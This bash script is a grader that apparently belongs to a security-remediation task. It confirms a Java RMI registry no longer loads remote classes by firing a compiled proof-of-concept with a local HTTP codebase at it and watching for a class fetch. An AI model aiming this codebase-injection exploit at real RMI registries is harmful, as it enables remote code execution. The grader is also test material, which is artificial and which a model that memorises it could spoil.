#!/bin/bash
# Scenario 33: Java RMI registry insecure default (useCodebaseOnly=false) ->
# unauthenticated remote class loading / RCE (CVE-2011-3556 class).
#
# BEHAVIOURAL verifier. It does NOT grep java.security (useCodebaseOnly is a JVM
# *system* property, not a security-properties entry, so a file edit proves
# nothing) and it does NOT read the boot script. Instead it runs the real
# exploit against the LIVE registry:
#   1. Stand up a local HTTP "codebase" server hosting a remote interface class
#      the registry does NOT have locally.
#   2. rebind() an object annotated with that codebase into the registry.
#   3. If the registry FETCHES the class over HTTP (a GET hits our server), it is
#      loading remote code from a client-supplied URL -> useCodebaseOnly=false ->
#      VULNERABLE.
# With useCodebaseOnly=true the registry refuses the annotation, throws, and never
# makes the HTTP request.
#
#   registry running, useCodebaseOnly=false -> GET observed  -> FAIL
#   registry running, useCodebaseOnly=true  -> no GET         -> PASS
#   config edited but JVM not restarted     -> GET observed  -> FAIL (old JVM)
#
# Exit 0 = remediated, Exit 1 = still vulnerable or broken.

set -u

HOST=127.0.0.1
PORT=1099
HTTP_PORT=18099
WORK=$(mktemp -d)
HTTP_PID=""
cleanup() { [ -n "$HTTP_PID" ] && kill "$HTTP_PID" 2>/dev/null; rm -rf "$WORK"; }
trap cleanup EXIT

###############################################################################
# Liveness: the registry must already be running. verify.sh must NEVER start it.
###############################################################################
if ! pgrep -f rmiregistry >/dev/null 2>&1; then
    echo "FAIL [Regression]: rmiregistry is not running — a dead registry is a" >&2
    echo "                   failure (verify.sh must not start it)." >&2
    exit 1
fi
if ! netstat -ln 2>/dev/null | grep -qE ':1099( |$)'; then
    echo "FAIL [Regression]: nothing listening on port 1099." >&2
    exit 1
fi

###############################################################################
# Build the exploit + a legitimate client.
###############################################################################
cat > "$WORK/PayloadIntf.java" <<'EOF'
import java.rmi.Remote; import java.rmi.RemoteException;
public interface PayloadIntf extends Remote { String go() throws RemoteException; }
EOF
cat > "$WORK/Payload.java" <<'EOF'
import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject;
public class Payload extends UnicastRemoteObject implements PayloadIntf {
    public Payload() throws RemoteException { super(); }
    public String go() { return "pwn"; }
}
EOF
cat > "$WORK/Attack.java" <<'EOF'
import java.rmi.registry.*;
public class Attack {
    public static void main(String[] a) {
        try {
            Registry r = LocateRegistry.getRegistry(a[0], Integer.parseInt(a[1]));
            r.rebind("evil", new Payload());
            System.out.println("REBIND_OK");
        } catch (Throwable t) {
            System.out.println("REBIND_ERR:" + t.getClass().getName());
        } finally { System.exit(0); }
    }
}
EOF
cat > "$WORK/Legit.java" <<'EOF'
import java.rmi.registry.*;
public class Legit {
    public static void main(String[] a) {
        try {
            Registry r = LocateRegistry.getRegistry(a[0], Integer.parseInt(a[1]));
            String[] n = r.list();
            System.out.println("LIST_OK:" + n.length);
        } catch (Throwable t) {
            System.out.println("LIST_ERR:" + t.getClass().getName());
        }
    }
}
EOF
if ! (cd "$WORK" && javac PayloadIntf.java Payload.java Attack.java Legit.java) 2>"$WORK/javac.err"; then
    echo "FAIL [Regression]: could not compile exploit harness:" >&2
    cat "$WORK/javac.err" >&2
    exit 1
fi

###############################################################################
# Wait for the registry to answer a legitimate list() before probing.
###############################################################################
UP=0
for i in $(seq 1 15); do
    L=$(cd "$WORK" && timeout 10 java -cp "$WORK" Legit "$HOST" "$PORT" 2>/dev/null)
    if echo "$L" | grep -q 'LIST_OK'; then UP=1; break; fi
    sleep 1
done
if [ "$UP" != "1" ]; then
    echo "FAIL [Regression]: RMI registry did not answer a legitimate list() call —" >&2
    echo "                   service is down or broken. last=$L" >&2
    exit 1
fi

###############################################################################
# PoC: force the registry to load a remote class from our HTTP codebase.
###############################################################################
mkdir -p "$WORK/httpdir"
cp "$WORK/PayloadIntf.class" "$WORK/Payload.class" "$WORK/httpdir/"
( cd "$WORK/httpdir" && python -m SimpleHTTPServer "$HTTP_PORT" >"$WORK/http.log" 2>&1 ) &
HTTP_PID=$!

###############################################################################
# POSITIVE CONTROL: the codebase HTTP server MUST actually be bound and serving
# before "no class fetch" can be read as "safe". If SimpleHTTPServer never
# started (port clash, python breakage, kill), http.log would stay empty and the
# PoC below would trivially find no fetch — a false PASS while the registry is
# still useCodebaseOnly=false. We fire a control GET at a SENTINEL path (distinct
# from the payload class) and require the server to log it. Absence => ERROR/FAIL.
###############################################################################
SENTINEL="__cb_probe_$$__"
CB_UP=0
for i in $(seq 1 15); do
    python - "$HTTP_PORT" "$SENTINEL" >/dev/null 2>&1 <<'PY'
import sys, urllib
port = sys.argv[1]; sentinel = sys.argv[2]
try:
    urllib.urlopen('http://127.0.0.1:%s/%s' % (port, sentinel)).read()
except Exception:
    pass
PY
    if grep -q "$SENTINEL" "$WORK/http.log" 2>/dev/null; then CB_UP=1; break; fi
    sleep 1
done
if [ "$CB_UP" != "1" ]; then
    echo "FAIL [Error]: the exploit's HTTP codebase server never bound port" >&2
    echo "              ${HTTP_PORT} (no control GET logged) — cannot conclude the" >&2
    echo "              registry is safe from a fetch that could never have happened." >&2
    echo "              http.log:" >&2
    tail -5 "$WORK/http.log" >&2 2>/dev/null
    exit 1
fi

( cd "$WORK" && timeout 25 java -cp "$WORK" \
    -Djava.rmi.server.codebase="http://127.0.0.1:${HTTP_PORT}/" \
    Attack "$HOST" "$PORT" >"$WORK/attack.out" 2>&1 )
sleep 2

if grep -q 'PayloadIntf.class' "$WORK/http.log" 2>/dev/null; then
    echo "FAIL [PoC]: registry fetched a remote class over HTTP from a client-supplied" >&2
    echo "            codebase (useCodebaseOnly=false) — remote class loading / RCE live:" >&2
    grep 'PayloadIntf.class' "$WORK/http.log" | head -1 >&2
    exit 1
fi
echo "PASS [PoC]: registry refused to load remote code from the client codebase."

###############################################################################
# Regression: the registry still serves legitimate clients.
###############################################################################
L=$(cd "$WORK" && timeout 10 java -cp "$WORK" Legit "$HOST" "$PORT" 2>/dev/null)
if ! echo "$L" | grep -q 'LIST_OK'; then
    echo "FAIL [Regression]: RMI registry no longer answers legitimate list(). got=$L" >&2
    exit 1
fi
echo "PASS [Regression]: RMI registry still serves legitimate clients ($L)."

echo "All checks passed."
exit 0
